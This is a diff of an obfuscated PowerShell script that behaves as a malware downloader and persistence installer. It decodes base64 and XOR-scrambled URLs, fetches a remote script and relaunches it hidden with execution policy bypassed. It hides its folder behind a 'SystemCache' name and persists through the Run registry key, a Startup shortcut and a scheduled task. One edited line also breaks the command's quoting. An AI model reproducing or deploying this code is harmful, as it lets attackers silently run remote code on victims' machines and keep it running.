@@ -2,7 +2,7 @@ $ErrorActionPreference="Stop"
 trap{continue}
 $urls=@(
     'aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A',
-    'aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA==',
+    'aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA=='
 )
 function d($s){[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($s))}
 $repo='https://'+(d($urls[0]) -replace '(.)',{param($c)[char]([byte][char]$c -bxor 1)}) -replace '[^\w\.\/\-]',''
@@ -16,13 +16,13 @@ try{
     if($remote.Content.Trim() -ne $localVersion){
         $tmp=Join-Path $env:TEMP $mainScript
         Invoke-WebRequest "$repo/$mainScript" -OutFile $tmp -TimeoutSec 10
-        $encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tmp`""))
+        $encoded=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tmp`""))
         Start-Process -FilePath powershell -ArgumentList "-EncodedCommand $encoded" -WindowStyle Hidden
         exit
     }
 }catch{}
 if(-not(Test-Path $dest)){New-Item -ItemType Directory -Path $dest -Force|Out-Null}
-try{Set-ItemProperty -Path $dest -Name 'Hidden' -Value $true}catch{}
+try{attrib +h $dest}catch{}
 foreach($f in $files){
     $t=Join-Path $dest $f
     if(-not(Test-Path $t)){
@@ -78,12 +78,12 @@ Wait-ForFiles @(
 
 $scps1 = Join-Path $dest "system_cache.ps1"
 if (Test-Path $scps1) {
-    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scps1`""
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File "$scps1""
 }
 function Test-Admin{
     $id=[Security.Principal.WindowsIdentity]::GetCurrent()
     $p=New-Object Security.Principal.WindowsPrincipal($id)
-    return $p.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 if(Test-Admin){
     try{
@@ -94,12 +94,12 @@ if(Test-Admin){
     }catch{}
 }
 try{
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemCache" -Value "$dest\system_cache.ps1"
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemCache" -Value "`"$dest\system_cache.ps1`""
     $sh=New-Object -ComObject WScript.Shell
     $lnk="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\cache.lnk"
     $sc=$sh.CreateShortcut($lnk)
     $sc.TargetPath="powershell.exe"
-    $sc.Arguments="-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest\system_cache.ps1`""
+    $sc.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest\system_cache.ps1`""
     $sc.WorkingDirectory=$dest
     $sc.Save()
     $action=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest\system_cache.ps1`""
